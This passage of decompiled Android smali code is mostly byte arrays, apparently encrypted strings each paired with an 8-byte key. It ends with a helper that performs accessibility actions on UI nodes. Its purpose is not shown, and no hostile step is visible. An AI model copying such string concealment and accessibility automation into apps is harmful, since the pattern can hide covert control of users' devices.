        -0x42t
        -0x46t
        -0x1et
        -0x1bt
        0x41t
    .end array-data

    nop

    :array_a
    .array-data 1
        -0x75t
        0x73t
        -0x70t
        -0x36t
        0x68t
        -0x36t
        -0x32t
        -0x73t
    .end array-data

    :array_b
    .array-data 1
        -0x6at
        -0x5et
        0x6ft
        0x61t
        0x43t
        0x5ft
        -0x1at
        0x21t
        -0x62t
        -0x58t
        0x24t
        0x71t
        0x59t
        0x42t
        -0xat
        0x74t
        -0x67t
        -0x3t
    .end array-data

    nop

    :array_c
    .array-data 1
        -0x9t
        -0x34t
        0xbt
        0x13t
        0x2ct
        0x36t
        -0x7et
        0x1bt
    .end array-data

    :array_d
    .array-data 1
        0x62t
        0x3t
        -0x1bt
        -0x3et
        0x5ct
        0x14t
        -0x80t
        0x57t
        0x6at
        0x9t
        -0x52t
        -0x2et
        0x46t
        0x9t
        -0x70t
        0x2t
        0x6dt
        0x5ft
    .end array-data

    nop

    :array_e
    .array-data 1
        0x3t
        0x6dt
        -0x7ft
        -0x50t
        0x33t
        0x7dt
        -0x1ct
        0x6dt
    .end array-data

    :array_f
    .array-data 1
        0x35t
        0x46t
        -0x36t
        -0x1et
        0x7at
        -0x5ct
        -0x25t
        -0x37t
        0x78t
        0x41t
        -0x38t
        -0x5ft
        0x72t
        -0x9t
        -0x39t
        -0x3ct
        0x79t
        0x5dt
        -0x32t
        -0x48t
        0x7bt
        -0x58t
    .end array-data

    nop

    :array_10
    .array-data 1
        0x56t
        0x29t
        -0x59t
        -0x34t
        0x17t
        -0x33t
        -0x52t
        -0x60t
    .end array-data

    :array_11
    .array-data 1
        0x1t
        0x48t
        0x66t
        0x71t
        -0x7ft
        -0x7ft
        0x79t
        -0x1et
        0x9t
        0x42t
        0x2dt
        0x61t
        -0x65t
        -0x64t
        0x69t
        -0x49t
        0xet
        0x14t
    .end array-data

    nop

    :array_12
    .array-data 1
        0x60t
        0x26t
        0x2t
        0x3t
        -0x12t
        -0x18t
        0x1dt
        -0x28t
    .end array-data

    :array_13
    .array-data 1
        0x32t
        0x72t
        -0x17t
        -0x2t
        -0x13t
        0x1ft
        -0x64t
        0x4ct
        0x3at
        0x78t
        -0x5et
        -0x12t
        -0x9t
        0x2t
        -0x74t
        0x19t
        0x3dt
        0x2dt
    .end array-data

    nop

    :array_14
    .array-data 1
        0x53t
        0x1ct
        -0x73t
        -0x74t
        -0x7et
        0x76t
        -0x8t
        0x76t
    .end array-data

    :array_15
    .array-data 1
        -0x17t
        -0x1ft
        0x4ct
        -0x1at
        0x3bt
        0x1et
        0x1at
        -0x16t
        -0x1ft
        -0x15t
        0x7t
        -0xat
        0x21t
        0x3t
        0xat
        -0x41t
        -0x1at
        -0x43t
    .end array-data

    nop

    :array_16
    .array-data 1
        -0x78t
        -0x71t
        0x28t
        -0x6ct
        0x54t
        0x77t
        0x7et
        -0x30t
    .end array-data

    :array_17
    .array-data 1
        0x41t
        0x36t
        -0x6t
        0x6ft
        -0x3t
        -0x70t
        0x6bt
        -0x13t
        0x49t
        0x3ct
        -0x4ft
        0x7ct
        -0x2t
        -0x64t
        0x7dt
        -0x5dt
        0x74t
        0x31t
        -0x16t
        0x71t
        -0x9t
    .end array-data

    nop

    :array_18
    .array-data 1
        0x20t
        0x58t
        -0x62t
        0x1dt
        -0x6et
        -0x7t
        0xft
        -0x29t
    .end array-data

    :array_19
    .array-data 1
        -0x6ct
        0xbt
        -0x47t
        -0x9t
        0x79t
        -0x47t
        -0x22t
        0x75t
        -0x68t
        0xdt
        -0x50t
        -0x9t
        0x74t
        -0x4at
        -0x31t
        0x69t
        -0x6ct
        0xct
        -0x4ft
        -0x55t
        0x22t
        -0x42t
        -0x22t
        0x28t
        -0x6at
        0x8t
        -0x4ft
        -0x55t
        0x6ct
        -0x7dt
        -0x2dt
        0x73t
        -0x65t
        0x1t
    .end array-data

    nop

    :array_1a
    .array-data 1
        -0x9t
        0x64t
        -0x2ct
        -0x27t
        0x18t
        -0x29t
        -0x46t
        0x7t
    .end array-data

    :array_1b
    .array-data 1
        0x55t
        0x5t
        0x67t
        0x2at
        -0x16t
        0x14t
        -0x58t
        -0x2ft
        0x5dt
        0xft
        0x2ct
        0x3at
        -0x10t
        0x9t
        -0x48t
        -0x7ct
        0x5at
        0x59t
    .end array-data

    nop

    :array_1c
    .array-data 1
        0x34t
        0x6bt
        0x3t
        0x58t
        -0x7bt
        0x7dt
        -0x34t
        -0x15t
    .end array-data

    :array_1d
    .array-data 1
        -0x7bt
        -0x45t
        -0x1et
        0x2bt
        -0x14t
        -0x40t
        0xat
        -0x30t
        -0x38t
        -0x48t
        -0x12t
        0x70t
        -0x13t
        -0x2dt
        0x12t
        -0x26t
        -0x6ct
    .end array-data

    nop

    :array_1e
    .array-data 1
        -0x1at
        -0x2ct
        -0x71t
        0x5t
        -0x7dt
        -0x50t
        0x7at
        -0x41t
    .end array-data

    :array_1f
    .array-data 1
        0x2t
        -0x36t
        0x6bt
        -0x6ct
        0x4ct
        0x15t
        0x6ct
        -0x37t
        0x4ft
        -0x37t
        0x67t
        -0x31t
        0x4dt
        0x6t
        0x74t
        -0x3dt
        0x13t
        -0x61t
        0x6ft
        -0x22t
        0xct
        0x7t
        0x68t
        -0x38t
        0x3et
        -0x35t
        0x63t
        -0x23t
        0x42t
        0x11t
        0x75t
        -0x30t
        0x4t
    .end array-data

    nop

    :array_20
    .array-data 1
        0x61t
        -0x5bt
        0x6t
        -0x46t
        0x23t
        0x65t
        0x1ct
        -0x5at
    .end array-data

    :array_21
    .array-data 1
        0x3dt
        -0x2et
        0x22t
        0x34t
        -0x52t
        -0x5ft
        -0x1t
        -0x53t
        0x70t
        -0x2ft
        0x2et
        0x6ft
        -0x51t
        -0x4et
        -0x19t
        -0x59t
        0x2ct
        -0x79t
        0x26t
        0x7et
        -0x12t
        -0x4dt
        -0x5t
        -0x54t
        0x1t
        -0x33t
        0x20t
        0x69t
        -0x58t
        -0x5bt
        -0x1at
        -0x4ct
        0x3bt
    .end array-data

    nop

    :array_22
    .array-data 1
        0x5et
        -0x43t
        0x4ft
        0x1at
        -0x3ft
        -0x2ft
        -0x71t
        -0x3et
    .end array-data

    :array_23
    .array-data 1
        0x2dt
        0x61t
        0x69t
        0x15t
        -0x4ct
        0x37t
        0x5t
        -0x29t
        0x60t
        0x62t
        0x65t
        0x4et
        -0x4bt
        0x24t
        0x1dt
        -0x23t
        0x3ct
        0x34t
        0x6dt
        0x5ft
        -0xct
        0x33t
        0xdt
        -0x34t
        0x11t
        0x7bt
        0x6at
        0x52t
        -0x4bt
        0x34t
        0x1t
        -0x27t
        0x22t
        0x62t
        0x5bt
        0x56t
        -0x46t
        0x2et
        0x1bt
        -0x19t
        0x3at
        0x67t
        0x70t
        0x57t
        -0x42t
    .end array-data

    nop

    :array_24
    .array-data 1
        0x4et
        0xet
        0x4t
        0x3bt
        -0x25t
        0x47t
        0x75t
        -0x48t
    .end array-data

    :array_25
    .array-data 1
        -0x46t
        -0x1bt
        -0x21t
        -0x7ct
        -0x46t
        0x58t
        0x7t
        -0x2bt
        -0x9t
        -0x1at
        -0x2dt
        -0x21t
        -0x45t
        0x4bt
        0x1ft
        -0x21t
        -0x55t
        -0x50t
        -0x25t
        -0x32t
        -0x6t
        0x4at
        0x3t
        -0x2ct
        -0x7at
        -0x1ct
        -0x29t
        -0x33t
        -0x4ct
        0x5ct
        0x1et
        -0x34t
        -0x44t
    .end array-data

    nop

    :array_26
    .array-data 1
        -0x27t
        -0x76t
        -0x4et
        -0x56t
        -0x2bt
        0x28t
        0x77t
        -0x46t
    .end array-data

    :array_27
    .array-data 1
        0x60t
        -0x65t
        -0x74t
        -0x2ct
        -0x13t
        0x1dt
        0x49t
        0x2dt
        0x6ct
        -0x63t
        -0x7bt
        -0x2ct
        -0x20t
        0x12t
        0x58t
        0x31t
        0x60t
        -0x64t
        -0x7ct
        -0x78t
    .end array-data

    :array_28
    .array-data 1
        0x3t
        -0xct
        -0x1ft
        -0x6t
        -0x74t
        0x73t
        0x2dt
        0x5ft
    .end array-data

    :array_29
    .array-data 1
        -0x50t
        -0x40t
        -0x6et
        -0x63t
        0x17t
        0x19t
        0x6ct
        0x22t
        -0x44t
        -0x3at
        -0x65t
        -0x63t
        0x1at
        0x16t
        0x7dt
        0x3et
        -0x50t
        -0x39t
        -0x66t
        -0x3ft
        0x4ct
        0x1et
        0x6ct
        0x7ft
        -0x4ft
        -0x25t
        -0x6ft
        -0x14t
        0x18t
        0x12t
        0x6ft
        0x31t
        -0x59t
        -0x3at
        -0x77t
        -0x2at
    .end array-data

    :array_2a
    .array-data 1
        -0x2dt
        -0x51t
        -0x1t
        -0x4dt
        0x76t
        0x77t
        0x8t
        0x50t
    .end array-data

    :array_2b
    .array-data 1
        -0x49t
        -0x7bt
        0x61t
        -0x25t
        0x47t
        0x66t
        0x70t
        -0x19t
        -0x45t
        -0x7dt
        0x68t
        -0x25t
        0x4at
        0x69t
        0x61t
        -0x5t
        -0x49t
        -0x7et
        0x69t
        -0x79t
        0x1ct
        0x61t
        0x70t
        -0x46t
        -0x4at
        -0x62t
        0x62t
        -0x56t
        0x56t
        0x67t
        0x67t
        -0x4t
        -0x60t
        -0x7dt
        0x7at
        -0x70t
    .end array-data

    :array_2c
    .array-data 1
        -0x2ct
        -0x16t
        0xct
        -0xbt
        0x26t
        0x8t
        0x14t
        -0x6bt
    .end array-data

    :array_2d
    .array-data 1
        0x4at
        0x2ft
        -0x1ct
        -0x37t
        -0x10t
        -0x3t
        0xft
        0x13t
        0x46t
        0x29t
        -0x13t
        -0x37t
        -0x3t
        -0xet
        0x1et
        0xft
        0x4at
        0x28t
        -0x14t
        -0x6bt
        -0x55t
        -0x6t
        0xft
        0x4et
        0x5dt
        0x38t
        -0x3t
        -0x48t
        -0x1ct
        -0x3t
        0x2t
        0xft
        0x5at
        0x34t
        -0x18t
        -0x75t
        -0x3t
        -0x34t
        0x6t
        0x0t
        0x40t
        0x2et
        -0x2at
        -0x6dt
        -0x8t
        -0x19t
        0x7t
        0x4t
    .end array-data

    :array_2e
    .array-data 1
        0x29t
        0x40t
        -0x77t
        -0x19t
        -0x6ft
        -0x6dt
        0x6bt
        0x61t
    .end array-data

    :array_2f
    .array-data 1
        -0x66t
        -0x64t
        -0x21t
        -0x28t
        0x63t
        -0x1ft
        0x33t
        -0x64t
        -0x6at
        -0x66t
        -0x2at
        -0x28t
        0x6et
        -0x12t
        0x22t
        -0x80t
        -0x66t
        -0x65t
        -0x29t
        -0x7ct
        0x38t
        -0x1at
        0x33t
        -0x3ft
        -0x65t
        -0x79t
        -0x24t
        -0x57t
        0x6ct
        -0x16t
        0x30t
        -0x71t
        -0x73t
        -0x66t
        -0x3ct
        -0x6dt
    .end array-data

    :array_30
    .array-data 1
        -0x7t
        -0xdt
        -0x4et
        -0xat
        0x2t
        -0x71t
        0x57t
        -0x12t
    .end array-data

    :array_31
    .array-data 1
        -0x58t
        0x4bt
        0x13t
        -0x57t
        -0x1at
        0x3dt
        -0x56t
        0x19t
        -0x60t
        0x41t
        0x58t
        -0x47t
        -0x4t
        0x20t
        -0x46t
        0x4ct
        -0x59t
        0x14t
    .end array-data

    nop

    :array_32
    .array-data 1
        -0x37t
        0x25t
        0x77t
        -0x25t
        -0x77t
        0x54t
        -0x32t
        0x23t
    .end array-data

    :array_33
    .array-data 1
        -0x3bt
        0x60t
        0x1t
        -0x6at
        -0x3bt
        0x37t
        0x13t
        -0x79t
        -0x33t
        0x6at
        0x4at
        -0x7at
        -0x21t
        0x2at
        0x3t
        -0x2et
        -0x36t
        0x3ct
    .end array-data

    nop

    :array_34
    .array-data 1
        -0x5ct
        0xet
        0x65t
        -0x1ct
        -0x56t
        0x5et
        0x77t
        -0x43t
    .end array-data

    :array_35
    .array-data 1
        0x41t
        0x52t
        -0x4t
        0x2et
        -0x7et
        -0x39t
        0x75t
        -0x5dt
        0x49t
        0x58t
        -0x49t
        0x3dt
        -0x7ft
        -0x35t
        0x63t
        -0x13t
        0x74t
        0x55t
        -0x14t
        0x30t
        -0x78t
    .end array-data

    nop

    :array_36
    .array-data 1
        0x20t
        0x3ct
        -0x68t
        0x5ct
        -0x13t
        -0x52t
        0x11t
        -0x67t
    .end array-data

    :array_37
    .array-data 1
        0x67t
        0x16t
        -0x63t
        -0x52t
        -0x44t
        -0x24t
        0x3ft
        0x68t
        0x6ft
        0x1ct
        -0x2at
        -0x42t
        -0x5at
        -0x3ft
        0x2ft
        0x3dt
        0x68t
        0x4at
    .end array-data

    nop

    :array_38
    .array-data 1
        0x6t
        0x78t
        -0x7t
        -0x24t
        -0x2dt
        -0x4bt
        0x5bt
        0x52t
    .end array-data

    :array_39
    .array-data 1
        0x71t
        0x5ct
        -0x67t
        -0x6ft
        -0x5at
        -0x7t
        0x5bt
        0x5et
        0x7ct
        0x5ct
        -0x7at
        -0x6ft
        -0x51t
        -0x2t
        0x57t
        0x43t
        0x7dt
        0x5at
        -0x70t
        -0x6ft
        -0x5et
        -0xft
        0x46t
        0x5ft
        0x71t
        0x5bt
        -0x6ft
        -0x33t
    .end array-data

    :array_3a
    .array-data 1
        0x12t
        0x33t
        -0xct
        -0x41t
        -0x32t
        -0x70t
        0x33t
        0x31t
    .end array-data

    :array_3b
    .array-data 1
        0xdt
        -0x31t
        -0x4ft
        0x23t
        0x38t
        0x50t
        -0x11t
        0x63t
        0x5t
        -0x3bt
        -0x6t
        0x33t
        0x22t
        0x4dt
        -0x1t
        0x36t
        0x2t
        -0x70t
    .end array-data

    nop

    :array_3c
    .array-data 1
        0x6ct
        -0x5ft
        -0x2bt
        0x51t
        0x57t
        0x39t
        -0x75t
        0x59t
    .end array-data

    :array_3d
    .array-data 1
        -0x29t
        -0x37t
        0x3dt
        -0x8t
        -0x2dt
        -0x67t
        0x6dt
        0x2at
        -0x21t
        -0x3dt
        0x76t
        -0x18t
        -0x37t
        -0x7ct
        0x7dt
        0x7ft
        -0x28t
        -0x6bt
    .end array-data

    nop

    :array_3e
    .array-data 1
        -0x4at
        -0x59t
        0x59t
        -0x76t
        -0x44t
        -0x10t
        0x9t
        0x10t
    .end array-data

    :array_3f
    .array-data 1
        0x45t
        -0x80t
        -0x64t
        0x2et
        0x1t
        -0x16t
        0x3dt
        0x7ct
        0x48t
        -0x80t
        -0x7dt
        0x2et
        0x8t
        -0x13t
        0x31t
        0x61t
        0x49t
        -0x7at
        -0x6bt
        0x2et
        0x5t
        -0x1et
        0x20t
        0x7dt
        0x45t
        -0x79t
        -0x6ct
        0x72t
        0x53t
        -0x16t
        0x31t
        0x3ct
        0x42t
        -0x76t
        -0x63t
        0x65t
        0x1dt
        -0x1at
        0xat
        0x7at
        0x52t
        -0x76t
        -0x64t
    .end array-data

    :array_40
    .array-data 1
        0x26t
        -0x11t
        -0xft
        0x0t
        0x69t
        -0x7dt
        0x55t
        0x13t
    .end array-data

    :array_41
    .array-data 1
        0x16t
        -0x15t
        -0x24t
        -0x68t
        0x62t
        -0x78t
        0x2et
        -0x76t
        0x1bt
        -0x15t
        -0x3dt
        -0x68t
        0x6bt
        -0x71t
        0x22t
        -0x69t
        0x1at
        -0x13t
        -0x2bt
        -0x68t
        0x66t
        -0x80t
        0x33t
        -0x75t
        0x16t
        -0x14t
        -0x2ct
        -0x3ct
        0x30t
        -0x78t
        0x22t
        -0x36t
        0x11t
        -0x1ft
        -0x23t
        -0x2dt
        0x7et
        -0x7ct
        0x19t
        -0x74t
        0x1t
        -0x1ft
        -0x24t
        -0x17t
        0x6ft
        -0x71t
        0x2et
        -0x7ct
        0x1bt
        -0x19t
        -0x2ct
        -0x2et
    .end array-data

    :array_42
    .array-data 1
        0x75t
        -0x7ct
        -0x4ft
        -0x4at
        0xat
        -0x1ft
        0x46t
        -0x1bt
    .end array-data

    :array_43
    .array-data 1
        -0x50t
        -0xct
        -0x1ft
        0x63t
        0x6et
        -0x5dt
        -0x67t
        -0x37t
        -0x48t
        -0x2t
        -0x56t
        0x73t
        0x74t
        -0x42t
        -0x77t
        -0x64t
        -0x41t
        -0x58t
    .end array-data

    nop

    :array_44
    .array-data 1
        -0x2ft
        -0x66t
        -0x7bt
        0x11t
        0x1t
        -0x36t
        -0x3t
        -0xdt
    .end array-data

    :array_45
    .array-data 1
        -0x4ft
        0x63t
        -0x19t
        0x23t
        -0x30t
        0x79t
        0x25t
        -0x5at
        -0x49t
        0x65t
        -0x5ct
        0x6ct
        -0x2at
        0x68t
        0x36t
        -0x42t
        -0x45t
        0x68t
        -0x5ct
        0x61t
        -0x27t
        0x79t
        0x2at
        -0x4et
        -0x46t
        0x69t
        -0x8t
    .end array-data

    :array_46
    .array-data 1
        -0x2et
        0xct
        -0x76t
        0xdt
        -0x48t
        0xct
        0x44t
        -0x2ft
    .end array-data

    :array_47
    .array-data 1
        0x33t
        0x68t
        -0x6at
        0x5ft
        0x9t
        -0x4dt
        0x22t
        0x7ct
        0x3bt
        0x62t
        -0x23t
        0x4ft
        0x13t
        -0x52t
        0x32t
        0x29t
        0x3ct
        0x37t
    .end array-data

    nop

    :array_48
    .array-data 1
        0x52t
        0x6t
        -0xet
        0x2dt
        0x66t
        -0x26t
        0x46t
        0x46t
    .end array-data

    :array_49
    .array-data 1
        0x27t
        -0x30t
        -0x4bt
        0x54t
        -0x13t
        0x4ct
        0x7et
        -0x67t
        0x2ft
        -0x26t
        -0x2t
        0x44t
        -0x9t
        0x51t
        0x6et
        -0x34t
        0x28t
        -0x74t
    .end array-data

    nop

    :array_4a
    .array-data 1
        0x46t
        -0x42t
        -0x2ft
        0x26t
        -0x7et
        0x25t
        0x1at
        -0x5dt
    .end array-data

    :array_4b
    .array-data 1
        0x12t
        0x5at
        -0x2ct
        -0x55t
        0x20t
        -0x57t
        -0x3et
        0x4at
        0x14t
        0x5ct
        -0x69t
        -0x1ct
        0x26t
        -0x48t
        -0x2ft
        0x52t
        0x18t
        0x51t
        -0x69t
        -0x17t
        0x29t
        -0x57t
        -0x33t
        0x5et
        0x19t
        0x50t
        -0x35t
        -0x41t
        0x21t
        -0x48t
        -0x74t
        0x59t
        0x14t
        0x59t
        -0x24t
        -0xft
        0x2dt
        -0x7dt
        -0x36t
        0x49t
        0x14t
        0x58t
    .end array-data

    nop

    :array_4c
    .array-data 1
        0x71t
        0x35t
        -0x47t
        -0x7bt
        0x48t
        -0x24t
        -0x5dt
        0x3dt
    .end array-data

    :array_4d
    .array-data 1
        -0x1et
        -0x25t
        -0x2bt
        -0x27t
        -0x6at
        -0x43t
        -0x2t
        0xat
        -0x1ct
        -0x23t
        -0x6at
        -0x6at
        -0x70t
        -0x54t
        -0x13t
        0x12t
        -0x18t
        -0x30t
        -0x6at
        -0x65t
        -0x61t
        -0x43t
        -0xft
        0x1et
        -0x17t
        -0x2ft
        -0x36t
        -0x33t
        -0x69t
        -0x54t
        -0x50t
        0x19t
        -0x1ct
        -0x28t
        -0x23t
        -0x7dt
        -0x65t
        -0x69t
        -0xat
        0x9t
        -0x1ct
        -0x27t
        -0x19t
        -0x6et
        -0x70t
        -0x60t
        -0x2t
        0x13t
        -0x1et
        -0x2ft
        -0x24t
    .end array-data

    :array_4e
    .array-data 1
        -0x7ft
        -0x4ct
        -0x48t
        -0x9t
        -0x2t
        -0x38t
        -0x61t
        0x7dt
    .end array-data

    :array_4f
    .array-data 1
        0x59t
        0x6ft
        -0x6at
        0x70t
        -0x6et
        -0x33t
        -0x7dt
        -0x79t
        0x51t
        0x65t
        -0x23t
        0x60t
        -0x78t
        -0x30t
        -0x6dt
        -0x2et
        0x56t
        0x33t
    .end array-data

    nop

    :array_50
    .array-data 1
        0x38t
        0x1t
        -0xet
        0x2t
        -0x3t
        -0x5ct
        -0x19t
        -0x43t
    .end array-data

    :array_51
    .array-data 1
        -0x6bt
        -0x7ct
        -0x3t
        -0x7ft
        -0x71t
        -0x6ct
        0x3bt
        0x2dt
        -0x63t
        -0x72t
        -0x4at
        -0x6ft
        -0x6bt
        -0x77t
        0x2bt
        0x78t
        -0x66t
        -0x25t
    .end array-data

    nop

    :array_52
    .array-data 1
        -0xct
        -0x16t
        -0x67t
        -0xdt
        -0x20t
        -0x3t
        0x5ft
        0x17t
    .end array-data

    :array_53
    .array-data 1
        -0x10t
        0x5et
        0x30t
        0x43t
        -0x7et
        0x17t
        -0x31t
        0x53t
        -0x8t
        0x54t
        0x7bt
        0x53t
        -0x68t
        0xat
        -0x21t
        0x6t
        -0x1t
        0x2t
    .end array-data

    nop

    :array_54
    .array-data 1
        -0x6ft
        0x30t
        0x54t
        0x31t
        -0x13t
        0x7et
        -0x55t
        0x69t
    .end array-data

    :array_55
    .array-data 1
        0x6ct
        0x63t
        -0x75t
        0x32t
        0x49t
        0x28t
        0x24t
        0x21t
        0x64t
        0x69t
        -0x40t
        0x21t
        0x4at
        0x24t
        0x32t
        0x6ft
        0x59t
        0x64t
        -0x65t
        0x2ct
        0x43t
    .end array-data

    nop

    :array_56
    .array-data 1
        0xdt
        0xdt
        -0x11t
        0x40t
        0x26t
        0x41t
        0x40t
        0x1bt
    .end array-data

    :array_57
    .array-data 1
        -0xdt
        0x23t
        0x4et
        0x3et
        0x69t
        0x1t
        -0x31t
        -0x14t
        -0x5t
        0x29t
        0x5t
        0x2et
        0x73t
        0x1ct
        -0x21t
        -0x47t
        -0x4t
        0x7ft
    .end array-data

    nop

    :array_58
    .array-data 1
        -0x6et
        0x4dt
        0x2at
        0x4ct
        0x6t
        0x68t
        -0x55t
        -0x2at
    .end array-data

    :array_59
    .array-data 1
        0x22t
        -0xat
        0x59t
        0x48t
        0xdt
        -0x7at
        0x41t
        -0x60t
        0x2at
        -0x4t
        0x12t
        0x58t
        0x17t
        -0x65t
        0x51t
        -0xbt
        0x2dt
        -0x57t
    .end array-data

    nop

    :array_5a
    .array-data 1
        0x43t
        -0x68t
        0x3dt
        0x3at
        0x62t
        -0x11t
        0x25t
        -0x66t
    .end array-data

    :array_5b
    .array-data 1
        0x6bt
        0x72t
        -0x7ft
        -0x50t
        -0x74t
        0x2ct
        -0x3dt
        0x58t
        0x63t
        0x78t
        -0x36t
        -0x60t
        -0x6at
        0x31t
        -0x2dt
        0xdt
        0x64t
        0x2et
    .end array-data

    nop

    :array_5c
    .array-data 1
        0xat
        0x1ct
        -0x1bt
        -0x3et
        -0x1dt
        0x45t
        -0x59t
        0x62t
    .end array-data

    :array_5d
    .array-data 1
        0x3et
        -0x5dt
        0xat
        0x45t
        0x60t
        -0x27t
        0x40t
        0x33t
    .end array-data

    :array_5e
    .array-data 1
        0x12t
        -0x59t
        0x2ct
        0x1dt
        0x28t
        0x6et
        0x6et
        0x4bt
        0x1et
        -0x5ft
        0x25t
        0x1dt
        0x25t
        0x61t
        0x7ft
        0x57t
        0x12t
        -0x60t
        0x24t
        0x41t
        0x7at
        0x3at
        0x63t
        0x5dt
        0x5et
        -0x57t
        0x2dt
        0x56t
        0x3bt
        0x74t
        0x5et
        0x50t
        0x5t
        -0x5ct
        0x24t
    .end array-data

    :array_5f
    .array-data 1
        0x71t
        -0x38t
        0x41t
        0x33t
        0x49t
        0x0t
        0xat
        0x39t
    .end array-data

    :array_60
    .array-data 1
        -0x16t
        -0x1ft
        -0x2et
        0x48t
        -0x1ct
        -0x75t
        0x58t
        -0x13t
        -0x1et
        -0x15t
        -0x67t
        0x58t
        -0x2t
        -0x6at
        0x48t
        -0x48t
        -0x1bt
        -0x43t
    .end array-data

    nop

    :array_61
    .array-data 1
        -0x75t
        -0x71t
        -0x4at
        0x3at
        -0x75t
        -0x1et
        0x3ct
        -0x29t
    .end array-data

    :array_62
    .array-data 1
        0x8t
        0x5ct
        0x70t
        -0x6ft
        0x10t
        0x4ct
        -0x30t
        0xat
        0x0t
        0x56t
        0x3bt
        -0x7et
        0x13t
        0x40t
        -0x3at
        0x44t
        0x3dt
        0x5bt
        0x60t
        -0x71t
        0x1at
    .end array-data

    nop

    :array_63
    .array-data 1
        0x69t
        0x32t
        0x14t
        -0x1dt
        0x7ft
        0x25t
        -0x4ct
        0x30t
    .end array-data

    :array_64
    .array-data 1
        0x69t
        -0x75t
        -0x60t
        0x7ft
        -0x73t
        0x7et
        0x3ct
        0x14t
        0x24t
        -0x6ct
        -0x58t
        0x23t
        -0x6at
        0x7et
        0x39t
        0x8t
        0x63t
        -0x75t
        -0x5dt
        0x3ct
        -0x66t
        0x79t
        0x2bt
        0x1ct
        0x6ft
        -0x6at
        -0x9t
        0x38t
        -0x61t
        0x38t
        0x3et
        0x1et
        0x72t
        -0x70t
        -0x6et
        0x3ct
        -0x78t
        0x70t
    .end array-data

    nop

    :array_65
    .array-data 1
        0xat
        -0x1ct
        -0x33t
        0x51t
        -0x5t
        0x17t
        0x4at
        0x7bt
    .end array-data

    :array_66
    .array-data 1
        0x7bt
        0x31t
        0x5dt
        -0x77t
        -0x2dt
        -0x1at
        0x2ct
        0x69t
        0x73t
        0x3bt
        0x16t
        -0x67t
        -0x37t
        -0x5t
        0x3ct
        0x3ct
        0x74t
        0x6dt
    .end array-data

    nop

    :array_67
    .array-data 1
        0x1at
        0x5ft
        0x39t
        -0x5t
        -0x44t
        -0x71t
        0x48t
        0x53t
    .end array-data

    :array_68
    .array-data 1
        0x7ft
        -0x5ft
        -0x4et
        0x66t
        0x76t
        0x46t
        0x11t
        -0x5t
        0x70t
        -0x51t
        -0x56t
        0x26t
        0x77t
        0x4ct
        0x1ft
        -0x59t
        0x2et
        -0xct
        -0x4at
        0x2ct
        0x3bt
        0x51t
        0x14t
        -0x44t
        0x72t
        -0x43t
        -0x55t
        0x29t
        0x78t
        0x48t
        0x25t
        -0x5ft
        0x75t
        -0x46t
        -0x4dt
        0x2dt
    .end array-data

    :array_69
    .array-data 1
        0x1ct
        -0x32t
        -0x21t
        0x48t
        0x14t
        0x24t
        0x7at
        -0x2bt
    .end array-data

    :array_6a
    .array-data 1
        -0x76t
        -0x5t
        -0x78t
        -0x7et
        -0x2t
        0x49t
        0x5dt
        -0x58t
        -0x7et
        -0xft
        -0x3dt
        -0x6et
        -0x1ct
        0x54t
        0x4dt
        -0x3t
        -0x7bt
        -0x59t
    .end array-data

    nop

    :array_6b
    .array-data 1
        -0x15t
        -0x6bt
        -0x14t
        -0x10t
        -0x6ft
        0x20t
        0x39t
        -0x6et
    .end array-data

    :array_6c
    .array-data 1
        0x68t
        -0x7ft
        0x67t
        0x78t
        -0x38t
    .end array-data

    nop

    :array_6d
    .array-data 1
        0x0t
        -0x12t
        0x9t
        0x17t
        -0x46t
        0x7dt
        0x2et
        0x48t
    .end array-data
.end method

.method private static i(Landroid/view/accessibility/AccessibilityNodeInfo;I)Z
    .locals 0

    .line 1
    if-nez p0, :cond_0

    const/4 p0, 0x0

    return p0

    :cond_0
    :try_start_0
    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    move-result p1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    :try_start_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :catchall_0
    return p1

    :catchall_1
    move-exception p1

    :try_start_2
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    :catchall_2
    throw p1
.end method
